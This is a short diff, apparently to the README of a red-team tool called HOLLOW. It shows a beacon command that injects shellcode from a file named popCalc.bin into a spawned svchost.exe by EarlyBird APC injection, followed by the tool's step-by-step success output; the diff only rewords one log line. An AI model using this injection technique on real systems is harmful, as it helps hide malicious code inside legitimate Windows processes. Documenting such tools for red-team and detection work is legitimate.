@@ -17,7 +17,7 @@ beacon> hollow svchost.exe /Users/bobby.cooke/popCalc.bin
 [*] HOLLOW - EarlyBird Remote Process Shellcode Injector (@0xBoku|github.com/boku7) | (@JTHam0|github.com/Rodion0)
 [*]             (@n00bRage|github.com/josephkingstone) | (@OakTree__|github.com/git-oaktree)
 [*] Reading shellcode from: /Users/bobby.cooke/popCalc.bin
-[+] Success - Spawned process:  5464 (PID)
+[+] Success - Spawned process for svchost.exe at 5464 (PID)
 [+] Success - Allocated RE memory in remote process 5464 (PID) at: 0x000001A83BEC0000
 [+] Success - Wrote 280 bytes to memory in remote process 5464 (PID) at 0x000001A83BEC0000
 [+] Success - APC queued for main thread of 5464 (PID) to shellcode address 0x000001A83BEC0000
